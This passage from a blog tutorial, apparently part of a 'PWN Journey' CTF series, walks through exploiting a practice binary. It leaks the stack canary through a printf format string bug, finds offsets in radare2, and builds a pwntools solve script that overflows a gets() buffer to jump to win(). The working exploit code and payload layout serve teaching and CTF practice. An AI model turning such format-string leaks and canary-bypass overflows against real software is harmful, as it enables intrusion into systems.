+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> a <span style="color:#f92672">=</span> <span style="color:#ae81ff">64</span>;
+printf(<span style="color:#e6db74">&#34;%x %x %x&#34;</span>, a, a, a);
+</code></pre></div><p>Expected output:</p>
+<pre tabindex="0"><code>40 40 40
+</code></pre><p>But supposing we have 3 format identifiers with only a single argument.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> a <span style="color:#f92672">=</span> <span style="color:#ae81ff">64</span>;
+printf(<span style="color:#e6db74">&#34;%x %x %x&#34;</span>, a);
+</code></pre></div><p>And we get:</p>
+<pre tabindex="0"><code>40 3c27ed48 61879738
+</code></pre><p>Not meet the expected amount of arguments, <code>printf</code> simply continues printing the next values on the stack, <em>thus leaking</em> them. Hence, the latter two, <code>3c27ed48</code> and <code>61879738</code>, are probably not our <code>int a = 64</code> but <em>random</em> junk value on the stack.</p>
+<p>Let us have a glance at the vulnerable source again.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">vuln()<span style="color:#f92672">:</span>
+...
+	puts(<span style="color:#e6db74">&#34;Leak me&#34;</span>);
+    gets(buffer);
+
+    printf(buffer);
+    puts(<span style="color:#e6db74">&#34;&#34;</span>);
+
+    puts(<span style="color:#e6db74">&#34;Overflow me&#34;</span>);
+    gets(buffer);
+...
+</code></pre></div><p>The <code>puts</code> function allows us to leak the canary, we then can use that value to overwrite the canary itself and finally call <code>win()</code> to achieve the initial goal.</p>
+<p>Now to the most intriguing phase, let us load it in radare2 and in most practical cases, you should first check the protection properties of the binary. It either could be done using <a href="https://github.com/slimm609/checksec.sh">checksec</a> or <a href="https://r2wiki.readthedocs.io/en/latest/tools/rabin2/">rabin2</a>, whatever comes to your liking.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_12-49.png" alt=""></p>
+<p>Next, we want to set a breakpoint at the subsequent instruction near the first <code>gets</code> and a second breakpoint around the canary so that we can easily determine our canary offset.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_13-12.png" alt=""></p>
+<p>Executing the program and hit the first breakpoint at <code>0x00401163</code>, we are therefrom able to read the canary value. Furthermore, we can calculate the padding length between our buffer and the canary by evaluating <code>0x50 - 0x8 = 0x48 = 72 (decimal)</code>.</p>
+<pre tabindex="0"><code>[0x7f347597b050]&gt; s sym.vuln;pdf
+
+┌ 133: sym.vuln ();
+│           ; var int64_t var_50h @ rbp-0x50	; our 32-byte buffer
+│           ; var int64_t var_8h @ rbp-0x8		; canary variable
+...
+│           0x0040115a      64488b042528.  mov rax, qword fs:[0x28]	; stored canary in RAX
+│           0x00401163 b    488945f8       mov qword [var_8h], rax	; Breakpoint 1
+...
+
+[0x00401163]&gt; dr rax
+0xdc9e3a07a36a200
+[0x00401163]&gt;
+</code></pre><p>Our current canary value: <code>0xdc9e3a07a36a200</code></p>
+<p>Then, we need to know how far is it from our buffer offset to the canary&rsquo;s and in order to do so, let us hit the second breakpoint and read the stack.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_14-20.png" alt=""></p>
+<p>So the buffer is 15 addresses (or 64 bytes) from the canary, that is also the reason why <code>%15$p</code> is our input so that <code>puts</code> can print out the special sentinel value.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_14-26.png" alt=""></p>
+<p>And we successfully get the correct value of the canary.</p>
+<p>Nevertheless, keep in mind that stack canaries are randomized for every new process, so we have to automate the canary leaking procedure as below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./canary&#39;</span>)
+r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Leak me</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;%15$p&#39;</span>)
+
+canary <span style="color:#f92672">=</span> int(r<span style="color:#f92672">.</span>recvline(), <span style="color:#ae81ff">16</span>)
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;Canary: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> hex(canary))
+</code></pre></div><p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_14-45.png" alt=""></p>
+<p>And thus far we have had our skeleton payload:</p>
+<pre tabindex="0"><code>payload = PAD_TILL_CANARY (72) + CANARY + PAD_TIL_RIP (??) + WIN_OFFSET (??)
+</code></pre><p>In order to calculate <code>PAD_TIL_RIP</code>, let us get back to radare2 and set another breakpoint after the second <code>gets</code>.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_15-33.png" alt=""></p>
+<p>Stop at the second breakpoint we have set at the beginning, here I want you to remember that our current canary offset is at <code>0x7fffb74f25c0+16 = 0x7fffb74f25d0</code>.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_15-36.png" alt=""></p>
+<p>Follow the execution flow, we now hit the third breakpoint after <code>gets</code> then we examine the data chunk at <code>0x7fffb74f25d0</code>.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_15-44.png" alt=""></p>
+<p>Using <a href="https://r2wiki.readthedocs.io/en/latest/tools/ragg2/">ragg2</a> pattern, we now know the RIP offset is 16 bytes from the canary&rsquo;s start point, and the canary size is 8 (or 4 in 32-bit) bytes so our <code>PAD_TIL_RIP</code> is <code>16 - 8 = 8</code>.</p>
+<p>And the last factor is <code>WIN_OFFSET</code>, you can dump it out either using objdump</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_15-56.png" alt=""></p>
+<p>or <code>afl~win</code> within radare2.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_15-57.png" alt=""></p>
+<h3 id="solvepy-3">Solve.py<a href="#solvepy-3" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>You finally made it here, congratulation.</p>
+<pre tabindex="0"><code>payload = PAD_TILL_CANARY (72) + CANARY + PAD_TIL_RIP (8) + WIN_OFFSET (0x004011ec)
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./canary&#39;</span>)
+r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Leak me</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;%15$p&#39;</span>)
+
+canary <span style="color:#f92672">=</span> int(r<span style="color:#f92672">.</span>recvline(), <span style="color:#ae81ff">16</span>)
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;Canary: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> hex(canary))
+
+payload <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>nop()) <span style="color:#f92672">*</span> <span style="color:#ae81ff">72</span>	<span style="color:#75715e"># PAD_TIL_CANARY</span>
+payload <span style="color:#f92672">+=</span> p64(canary)					<span style="color:#75715e"># CANARY</span>
+payload <span style="color:#f92672">+=</span> asm(shellcraft<span style="color:#f92672">.</span>nop()) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>	<span style="color:#75715e"># PAD_TIL_RIP</span>
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x004011ec</span>)				<span style="color:#75715e"># WIN_OFFSET</span>
+
+r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Overflow me</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, payload)
+
+print(r<span style="color:#f92672">.</span>clean())
+</code></pre></div><p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_16-01.png" alt=""></p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://legiahuyy.github.io/blog/en/posts/pwns-2/">
+                <span class="button__icon">←</span>
+                <span class="button__text">PWN Journey: Part 2</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="https://legiahuyy.github.io/blog/en/posts/htb-bountyhunter/">
+                <span class="button__text">HackTheBox: BountyHunter</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>© 2022 The Archivist</a>.</span>
+    
+        <span>All posts are licensed under <a href="https://creativecommons.org/licenses/by/4.0/legalcode">CC BY 4.0</a>.</span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://legiahuyy.github.io/blog/en/assets/main.js"></script>
+<script src="https://legiahuyy.github.io/blog/en/assets/prism.js"></script>
+
+
+
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+
+<script>
+const images = Array.from(document.querySelectorAll(".post-content img"));
+images.forEach(img => {
+  mediumZoom(img, {
+    margin: 0,  
+    background: '#222129',
+    scrollOffset: 40,  
+    container: null,  
+    template: null  
+  });
+});
+</script>
+
+
+  
+</div>
+
+</body>
+</html>
